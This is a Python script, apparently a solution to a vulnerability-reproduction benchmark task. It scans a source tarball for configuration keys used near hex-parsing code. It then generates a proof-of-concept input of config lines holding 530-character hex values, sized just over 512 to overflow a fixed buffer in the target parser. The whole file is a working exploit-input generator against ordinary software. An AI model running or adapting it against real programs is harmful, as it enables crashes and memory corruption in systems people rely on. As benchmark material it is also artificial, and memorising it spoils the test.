import os
import tarfile
import re

class Solution:
    def solve(self, src_path: str) -> bytes:
        def extract_candidate_keys_from_source(tar_path):
            keys_score = {}
            hex_markers = ('isxdigit', 'hex', 'fromhex', 'tohex', 'hexdigit', 'strtol', 'strtoul', '%x', '%X', 'sscanf', 'hexstring', 'hex_value', 'hexval')
            string_re = re.compile(r'"([^"\n]{1,64})"')
            strcmp_re = re.compile(r'str(?:case)?cmp\s*\(\s*([a-zA-Z_][\w]*)\s*,\s*"([^"\n]{1,64})"\s*\)')
            # Acceptable key pattern
            key_pat = re.compile(r'^[A-Za-z0-9_.\-]+$')

            try:
                tf = tarfile.open(tar_path, 'r:*')
            except Exception:
                return []

            for member in tf.getmembers():
                if not member.isfile():
                    continue
                # Only consider small/medium text-like files
                if member.size > 2_000_000:
                    continue
                name_lower = member.name.lower()
                if not any(name_lower.endswith(ext) for ext in ('.c', '.h', '.hpp', '.hh', '.cc', '.cpp', '.cxx', '.l', '.y', '.py', '.rs', '.go', '.java', '.m', '.mm', '.txt', '.md', '.conf', '.ini', '.cfg', '.yaml', '.yml', '.toml')):
                    continue
                try:
                    f = tf.extractfile(member)
                    if not f:
                        continue
                    data = f.read()
                except Exception:
                    continue
                if not data:
                    continue
                try:
                    text = data.decode('utf-8', errors='ignore')
                except Exception:
                    continue
                text_low = text.lower()

                # Quick filter: only process files that mention a hex-related marker
                if not any(marker in text_low for marker in hex_markers):
                    continue

                # Find positions of hex markers
                hex_positions = []
                for m in re.finditer(r'isxdigit|hex|fromhex|tohex|hexdigit|strtol|strtoul|%x|%X|sscanf|hexstring|hex_value|hexval', text_low):
                    hex_positions.append(m.start())
                if not hex_positions:
                    continue

                # Collect string literals and strcmp targets near hex markers
                candidates = set()
                for m in strcmp_re.finditer(text):
                    candidates.add((m.start(), m.group(2)))
                # Also any string literal (fallback)
                for m in string_re.finditer(text):
                    candidates.add((m.start(), m.group(1)))

                # Score candidates by proximity to hex contexts
                for pos, s in candidates:
                    if len(s) < 2 or len(s) > 64:
                        continue
                    if not key_pat.match(s):
                        continue
                    # Filter out obviously non-keys
                    s_low = s.lower()
                    if s_low in {'true','false','yes','no','on','off','null','none','error','warning','debug','info','trace','usage'}:
                        continue
                    if s_low.startswith('http://') or s_low.startswith('https://'):
                        continue
                    # Compute proximity score
                    nearest = min((abs(pos - hp) for hp in hex_positions), default=10**9)
                    score = max(0.0, 1_000_000.0 / (1.0 + nearest))
                    keys_score[s] = keys_score.get(s, 0.0) + score

            tf.close()
            # Return keys sorted by score
            sorted_keys = sorted(keys_score.items(), key=lambda kv: kv[1], reverse=True)
            # Filter to likely config keys based on common substrings
            preferred = []
            others = []
            pref_subs = ('key', 'hex', 'color', 'hash', 'addr', 'address', 'token', 'secret', 'public', 'private', 'bg', 'fg', 'rgb', 'mac', 'seed', 'signature', 'blob', 'data', 'serial', 'uuid', 'guid', 'palette')
            for k, _ in sorted_keys:
                kl = k.lower()
                if any(sub in kl for sub in pref_subs):
                    preferred.append(k)
                else:
                    others.append(k)
            result = preferred + others
            # Unique preserve order
            seen = set()
            uniq = []
            for k in result:
                if k not in seen:
                    seen.add(k)
                    uniq.append(k)
            return uniq[:10]

        # Extract candidate keys
        keys = extract_candidate_keys_from_source(src_path)
        # Fallback keys if none found
        if not keys:
            keys = [
                'hex',
                'key',
                'color',
                'hash',
                'address',
                'public_key',
                'private_key',
                'bg',
                'fg',
                'rgb'
            ]

        # Choose a handful of keys to limit size
        keys = keys[:5]

        # Build PoC lines with long hex strings. Use length slightly over 512 (e.g., 530)
        hex_len = 530  # even number to form full bytes if parser groups by pairs
        # Create different hex sequences to avoid any deduplication or early cutoffs
        seqs = [
            'a' * hex_len,
            'b' * hex_len,
            'c' * hex_len,
            'd' * hex_len,
            'e' * hex_len,
            'f' * hex_len,
            ''.join('0123456789abcdef'[(i % 16)] for i in range(hex_len))
        ]

        lines = []
        # Mix of assignment styles
        styles = [
            '{k}=0x{v}',
            '{k} = 0x{v}',
            '{k}: 0x{v}',
            '{k}\t0x{v}',
            '{k}="0x{v}"',
            '{k} = "0x{v}"'
        ]

        # Compose lines prioritizing likely keys
        seq_idx = 0
        for k in keys:
            for s in styles[:2]:
                v = seqs[seq_idx % len(seqs)]
                lines.append(s.format(k=k, v=v))
                seq_idx += 1

        # Add a couple more variants to broaden chances
        extra_keys = ['token', 'secret', 'signature']
        for k in extra_keys:
            v = seqs[seq_idx % len(seqs)]
            lines.append(f'{k}=0x{v}')
            seq_idx += 1

        # Finally, include a raw hex-only line as a fallback
        lines.append('0x' + ('1' * hex_len))

        poc = '\n'.join(lines) + '\n'
        return poc.encode('ascii', errors='ignore')